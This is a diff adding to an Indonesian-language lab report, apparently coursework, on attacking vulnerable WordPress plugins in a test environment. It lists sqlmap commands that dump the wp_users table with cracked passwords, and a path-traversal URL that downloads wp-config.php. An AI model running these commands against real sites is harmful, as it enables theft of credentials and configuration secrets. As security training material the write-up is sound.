@@ -76,4 +76,38 @@ Pada uji coba ini dihasilkan hasil yang sama seperti ketika menggunakan plugin v
 ![league](asset/tugas2-023/16.PNG)
 
 ####Uji Coba Serangan SQL Injection
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Untuk melakukan uji coba serangan SQL Injection, maka kita memerlukan tools yang bernama [sqlmap](http://sqlmap.org). Kali ini kita akan mencoba melakukan serangan pada plugin League Manager dengan celah keamanan seperti pada website [ini](https://www.exploit-db.com/exploits/37182/). 
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Untuk melakukannya kita akan menyerang link dari pertandingan yang ada pada website tersebut. Perintah yang  digunakan untuk mendapatkan database yang digunakan adalah:
+```
+sqlmap --url "http://target.com/?match=1" --level 5 --risk 3 -dbs
+```
+```
+# sqlmap --url "http://10.151.36.38/wordpress/index.php/2016/10/12/tet?match=1" --level 5 --risk 3 -dbs
+```
 
+Maka akan dihasilkan :
+![getDB](asset/tugas2/getDB.png)
+
+Selanjutnya kita akan mencari tabel yang ada dalam database tersebut. Perintah yang digunakan adalah sebagai berikut ini:
+```
+# sqlmap --url "http://10.151.36.38/wordpress/index.php/2016/10/12/tet?match=1" --level 5 --risk 3 --tables -D wordpress
+```
+Akan muncul semua tabel yang ada. Disini kita menumukan table wp_user, untuk itu kita akan melihat data apa saja yang ada dalam tabel tersebut. Perintah yang digunakan adalah:
+```
+# sqlmap --url "http://10.151.36.38/wordpress/index.php/2016/10/12/tet?match=1" --level 5 --risk 3 --dump -D wordpress -T wp_users
+```
+
+Tara, kita mendapatkan hasil username dan password dari login wordpress yang terdaftar.
+
+![getUser](asset/tugas2/getUser.png)
+
+>Note: hasil password didapat karena hash sudah ada dalam dictionary
+
+####Uji Serangan pada Plugin HB Audio Gallery Lite 1.0.0
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Pada plugin tersebut terdapat sebuah celah keamanan berupa Arbitrary File Donwload. Jadi celah keamanan ini dapat mendownload file yang seharusnya tidak boleh diakses oleh pengguna. Dokumentasi dari celah ini dapat dibaca [disini](https://www.exploit-db.com/exploits/39589/). Cara memanfaatkan celah ini adalah dengan menggunakan  perintah:
+```
+/wp-content/plugins/hb-audio-gallery-lite/gallery/audio-download.php?file_path=../../../../wp-config.php&file_size=10
+```
+
+Setelah menjalankan perintah tersebut maka file wp-config.php akan didownload.
+![getWp-config](asset/tugas2/getWp-config.png)
